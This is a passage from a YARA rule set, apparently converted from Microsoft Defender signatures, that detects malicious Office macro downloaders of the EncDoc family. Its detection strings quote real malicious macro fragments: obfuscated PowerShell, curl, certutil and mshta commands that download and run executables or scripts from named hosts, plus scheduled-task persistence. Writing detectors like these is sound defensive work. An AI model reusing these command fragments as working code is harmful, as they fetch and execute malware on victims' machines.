        threat_id = "2147823768"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "subautoclosesocialbottleoneguytagdebugprintcallvbashellsocialvbnormalfocusendsub" ascii //weight: 1
        $x_1_2 = "subautocloseyoutubehakalolcontroltiptextdebugprintcallvbashellyoutubevbnormalfocusendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AMLF_2147823768_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AMLF!MTB"
        threat_id = "2147823768"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {25 62 79 26 5e 25 61 73 73 2d 63 28 22 2b 22 69 22 2b 22 27 22 2b 22 77 22 2b 22 27 22 2b 22 72 22 2b 22 28 27 68 74 74 70 73 3a 2f 2f 62 69 74 62 75 63 6b 65 74 2e 6f 72 67 2f 21 61 70 69 2f 32 2e 30 2f 73 6e 69 70 70 65 74 73 2f 6e 65 77 77 6f 72 6b 31 32 33 73 6f 63 69 61 6c 2f [0-10] 2f [0-48] 2f 66 69 6c 65 73 2f [0-15] 2e 74 78 74 27 29}  //weight: 1, accuracy: Low
        $x_1_2 = "vba.replace(tntxwq,\"<\",\"n\")endfunctionsubauto_open()msgbox\"error!\"callshell@(tntxwq,0)endsub" ascii //weight: 1
        $x_1_3 = "tntxwq=vba.replace(tntxwq,\"&^%\",\"p\")tntxwq=vba.replace(tntxwq,\"$rgeyt%\",\"o\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AMLF_2147823768_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AMLF!MTB"
        threat_id = "2147823768"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Z = Textfilepart.mosuf1." ascii //weight: 1
        $x_1_2 = "D = Textfilepart.MultiPage1.Tag" ascii //weight: 1
        $x_1_3 = "Function XXX() As String" ascii //weight: 1
        $x_1_4 = "= Textfilepart.stuff.Tag" ascii //weight: 1
        $x_1_5 = "Private Sub Workbook_BeforeClose(Cancel As Boolean)" ascii //weight: 1
        $x_1_6 = "Shor = moneycount.UX + moneycount.TR + monstercoming.Z + kon.D + lun.openmarket1245 + lun.XXX + showoff.Konsa + showoff.T" ascii //weight: 1
        $x_1_7 = "MsgBox \"Office Error!!!\":" ascii //weight: 1
        $x_1_8 = "Call Shell(Shor)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AMLF_2147823768_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AMLF!MTB"
        threat_id = "2147823768"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Z = Textfilepart.mosuf1.ControlTipText" ascii //weight: 1
        $x_1_2 = "D = Textfilepart.MultiPage1.Tag" ascii //weight: 1
        $x_1_3 = "Function XXX() As String" ascii //weight: 1
        $x_1_4 = "Konsa = Textfilepart.stuff.Tag" ascii //weight: 1
        $x_1_5 = "Dim Opera As New najma" ascii //weight: 1
        $x_1_6 = "Dim textfileforyou As New modern" ascii //weight: 1
        $x_1_7 = "openworldforyou = Opera.X + Opera.Y + textfileforyou.Z + textfileforyou.D + hi.openmarket1245 + hi.XXX + hi.Konsa + hi.T" ascii //weight: 1
        $x_1_8 = "MsgBox \"Error!!!\": _" ascii //weight: 1
        $x_1_9 = "Call Shell!(openworldforyou)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STUV_2147823770_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STUV!MTB"
        threat_id = "2147823770"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Const leek = \"zpogadoment\"" ascii //weight: 1
        $x_1_2 = "C:\\Users\\Public\\aprend.b" ascii //weight: 1
        $x_1_3 = "Replace(\"powKfmmd67rshKfmmd67ll\", \"Kfmmd67\", \"^e^\")" ascii //weight: 1
        $x_1_4 = {26 20 22 20 2d 77 20 68 69 64 20 73 6c 65 65 5e 70 20 2d 53 65 20 33 33 3b 53 74 61 5e 72 74 2d 42 5e 69 74 73 54 5e 72 61 5e 6e 73 66 65 5e 72 20 2d 53 6f 75 20 68 74 74 5e 70 3a 2f 2f 64 64 6c 37 2e 64 61 74 61 2e 68 75 2f 67 65 74 2f [0-31] 2f [0-31] 2f [0-31] 2e 65 78 5e 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-31] 2e 65 5e 78 65 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-31] 2e 65 5e 78 65 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STWV_2147823777_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STWV!MTB"
        threat_id = "2147823777"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"D5-D70A-438B-8A42-984\"" ascii //weight: 1
        $x_1_2 = "Replace(\"\\J5oklzm5ppDJ5oklzm5tJ5oklzm5\\RoJ5oklzm5ming\\bella.lnk\", \"J5oklzm5\", \"a\")" ascii //weight: 1
        $x_1_3 = "\"C:\\\\Users\\\\Public\\\\webservices.e^xe\"" ascii //weight: 1
        $x_1_4 = {67 6f 64 6b 6e 6f 77 73 20 3d 20 52 65 70 6c 61 63 65 28 22 63 6d 64 2e [0-47] 20 2f 63 20 70 6f 77 5e [0-31] 5e [0-31] 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 3a 2f 2f 31 37 32 2e 39 33 2e 32 31 33 2e 31 34 39 3a 38 30 38 30 2f 75 70 6c 6f 61 64 2f [0-47] 2e [0-31] 5e [0-31] 20 2d 6f 20 22 20 26 20 76 61 7a 77 20 26 20 22 3b 22 20 26 20 76 61 7a 77 2c 20 22 [0-31] 22 2c 20 22 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STXV_2147823808_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STXV!MTB"
        threat_id = "2147823808"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Replace(\"powKfmmd67rshKfmmd67ll\", \"Kfmmd67\", \"^e^\")" ascii //weight: 1
        $x_1_2 = {26 20 22 20 2d 77 20 68 69 64 20 73 6c 65 65 5e 70 20 2d 53 65 20 33 33 3b 53 74 61 5e 72 74 2d 42 5e 69 74 73 54 5e 72 61 5e 6e 73 66 65 5e 72 20 2d 53 6f 75 20 68 74 74 5e 70 3a 2f 2f 64 64 6c 38 2e 64 61 74 61 2e 68 75 2f 67 65 74 2f [0-31] 2f [0-31] 2f [0-31] 2e 65 78 5e 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-31] 2e 65 5e 78 65 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-31] 2e 65 5e 78 65 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STYV_2147824149_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STYV!MTB"
        threat_id = "2147824149"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(\"C:\\Users\\Pubg98761ric\\beg98761r.g98761rnk\", \"g98761r\", \"l\")" ascii //weight: 1
        $x_1_2 = "\"C:\\\\Users\\\\Public\\\\DOC9932_AG9492.e^xe\"" ascii //weight: 1
        $x_1_3 = "godknows = Replace(\"cmd /c pow^ztbkbmj8rs^hztbkbmj8ll/W 01 c^u^rl htt^ps://transfztbkbmj8r.sh/gztbkbmj8t/ATMiuj/ffgff.ztbkbmj8^xztbkbmj8 -o \" & tckj & \";\" & tckj, \"ztbkbmj8\", \"e\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STZV_2147824365_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STZV!MTB"
        threat_id = "2147824365"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Replace(\"C:\\Users\\Pubg98761ric\\beg98761r.g98761rnk\", \"g98761r\", \"l\")" ascii //weight: 1
        $x_1_2 = {67 6f 64 6b 6e 6f 77 73 20 3d 20 52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e [0-31] 72 73 5e [0-31] 6c 6c 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 73 3a 2f 2f 74 72 61 6e 73 66 [0-31] 72 2e 73 68 2f [0-31] [0-31] 2f [0-31] 2e [0-31] 5e [0-31] 20 2d 6f 20 22 20 26 20 [0-31] 20 26 20 22 3b 22 20 26 20 [0-31] 2c 20 22 [0-31] 22 2c 20 22 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SYS_2147824972_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SYS!MTB"
        threat_id = "2147824972"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://webnar.info/msgboxvbs.htm\"" ascii //weight: 1
        $x_1_2 = "taskkill /f /im WinWord.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STCW_2147825919_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STCW!MTB"
        threat_id = "2147825919"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "You better choose somewhat random name here, as the possible script obfuscation" ascii //weight: 1
        $x_1_2 = "Sub Malware()" ascii //weight: 1
        $x_1_3 = "Sub imcool()" ascii //weight: 1
        $x_1_4 = "imgsrc = \"https://filebin.net/qaxc46gx7mud9bal/imcool.txt\"" ascii //weight: 1
        $x_1_5 = "\"C:\\Users\\hatice.kuerten\\Pictures\\test.txt\"" ascii //weight: 1
        $x_1_6 = "\"C:\\Users\\hatice.kuerten\\Pictures\\test.bat\"" ascii //weight: 1
        $x_1_7 = "setobjwmiservice=getobject(\"winmgmts:\"_&\"{impersonationlevel=impersonate}!\\\\\"_&strcomputer&\"\\root\\cimv2\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKSW_2147826422_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKSW!MTB"
        threat_id = "2147826422"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=kyJ0FmYu4Ea2JEdcdCIrASRMlkRPJFUSV0UVpjduVGJoASblRXatUmdv1WZytTKnMnY25CZhBXZ09mbcdCIrAXblRnO25WZkgyczV2YvJHctQnchR3c7kyJnAi" ascii //weight: 1
        $x_1_2 = "bp9matASK9VWdsFmdu8FJ7BCajFWRy9mRgwHIpcCdmVGTvRFdodWaSdCLn4yJsMEVkgyclh2Y0FWT6oTX4V2ZlJ3WogCWFl0OncCIul2bK1CIyITZ3RCLmRGNi" ascii //weight: 1
        $x_1_3 = "RCLzMGJ9MEVkszJhRmRpxWZocyJoRHdwpzLvc2b09mdhN2bpxmLj9Wbvo2c39mcsR2LQJ3b0V2Y0VGZgMEbpVmb05idiN3JnwCJl5md6QXZtB3KncCXu9GdlBXYk5idiN3Jn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKY_2147827013_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKY!MTB"
        threat_id = "2147827013"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ermkdf().Exec Erfmfke()" ascii //weight: 1
        $x_1_2 = "= Range(pNFaOrNblff).Value" ascii //weight: 1
        $x_1_3 = "= GetObject(ermkdsfs())" ascii //weight: 1
        $x_1_4 = "= hJRjHIwU(\"B200\") + hJRjHIwU(\"B205\") + hJRjHIwU(\"B207\") + hJRjHIwU(\"B208\") + \" -Wind\" + \"owSt\" + \"yle Hid\" + \"den \" + hJRjHIwU(\"B100\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ZSM_2147827776_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ZSM!MTB"
        threat_id = "2147827776"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "OkGDiiyUMQswUfv(\"706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6" ascii //weight: 1
        $x_1_2 = "Shell (EnxZUApJGDAAvxy)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKEC_2147828496_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKEC!MTB"
        threat_id = "2147828496"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fs.CreateTextFile(\"C:\\Users\\Public\\calc.bat\", True)" ascii //weight: 1
        $x_1_2 = "mshta \"\"https://skynetx.com.br/cvc.html" ascii //weight: 1
        $x_1_3 = "= \"https://bit.ly/3oOlcuE" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SZS_2147828555_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SZS!MTB"
        threat_id = "2147828555"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(\"cmd /c pow^quicklysexualrs^hquicklysexualll/W 01 c^u^rl htt^ps://915111.ru/wp-includquicklysexuals/rat.quicklysexual^xquicklysexual -o \" & carrythus & \";\" & carrythus, \"quicklysexual\", \"e\")" ascii //weight: 1
        $x_1_2 = "& \"lic\\xczuy.exe\"" ascii //weight: 1
        $x_1_3 = "Replace(\"rundfatha31vfatha31v32 urfatha31v.dfatha31vfatha31v,OpenURL \" & levelend, \"fatha31v\", \"l\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_POKK_2147828567_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.POKK!MTB"
        threat_id = "2147828567"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"curl.exe -s http://78.85.17.88:8443/reverse.ps1" ascii //weight: 1
        $x_1_2 = "Shell \"powershell.exe C:\\Windows\\Tasks\\reva.ps1\"" ascii //weight: 1
        $x_1_3 = "AutoClose()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVQ_2147828707_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVQ!MTB"
        threat_id = "2147828707"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "action.path=\"\\\\10.127.252.11\\share\\quietmoth.exe\"" ascii //weight: 1
        $x_1_2 = "=createobject(\"schedule.service\")" ascii //weight: 1
        $x_1_3 = "callservice.getfolder(\"\\\").registertaskdefinition(\"updatetask\",td,6,,,3)endsub" ascii //weight: 1
        $x_1_4 = "auto_close()docbestdaymothendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KAKA_2147829196_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KAKA!MTB"
        threat_id = "2147829196"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 73 61 79 6d 69 6e 61 6d 65 2e 63 6f 6d 2f 6e 65 77 2f 65 63 73 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KBKB_2147829204_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KBKB!MTB"
        threat_id = "2147829204"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 39 32 2e 33 2e 31 39 34 2e 32 34 36 2f 65 63 73 74 2e 65 78 65 22 22 20 [0-47] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-47] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KCKC_2147829207_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KCKC!MTB"
        threat_id = "2147829207"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://mckinneytighe.com/newmon/calc/Attack.jpg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KCKC_2147829207_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KCKC!MTB"
        threat_id = "2147829207"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 73 61 79 6d 69 6e 61 6d 65 2e 63 6f 6d 2f 6e 65 77 2f 70 72 6f 63 65 73 73 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_QWSM_2147830086_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.QWSM!MTB"
        threat_id = "2147830086"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "''+pmet:vne$,''sbv.tneilC detcetorP/igc/kt.gdceifv//:ptth''(eliF" ascii //weight: 1
        $x_1_2 = "''+pmet:vne$,''sbv.tneilC detcetorP/aloh/moc.anahgeissua//:ptth''(eliF" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDJ_2147830101_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDJ!MTB"
        threat_id = "2147830101"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "='olnwoD.)tnei' + 'lCb'; $c3=')''sbv.dapeton\\''+pmet:vne$,''sbv.tneilC detcetorP/noos/kt.denik//:ptth''(" ascii //weight: 1
        $x_1_2 = "='olnwoD.)tnei' + 'lCb'; $c3=')''sbv.dapeton\\''+pmet:vne$,''sbv.tneilC detcetorP/erif/kt.denik//:ptth''(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SBB_2147830286_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SBB!MTB"
        threat_id = "2147830286"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sbv.tneilC detcetorP/rennid/moc.anahgeissua//:ptth'" ascii //weight: 1
        $x_1_2 = "sbv.tneilC detcetorP/slcgjic/lm.dafdghf//:ptth'" ascii //weight: 1
        $x_1_3 = "$c50='eW.teN tc' + 'ejbO-weN(';$Ax1='olnwoD.)tnei' + 'lCb'; $c3=" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_QZSM_2147830449_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.QZSM!MTB"
        threat_id = "2147830449"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {27 29 27 27 73 62 76 2e 64 61 70 65 74 6f 6e 5c 27 27 2b 70 6d 65 74 3a 76 6e 65 24 2c 27 27 73 62 76 2e 74 6e 65 69 6c 43 20 64 65 74 63 65 74 6f 72 50 2f [0-16] 2f [0-16] 2f 2f 3a 70 74 74 68 27 27 28 65 6c 69 46}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_QVSM_2147830455_0
{
    meta:
        author = "defender2yara"
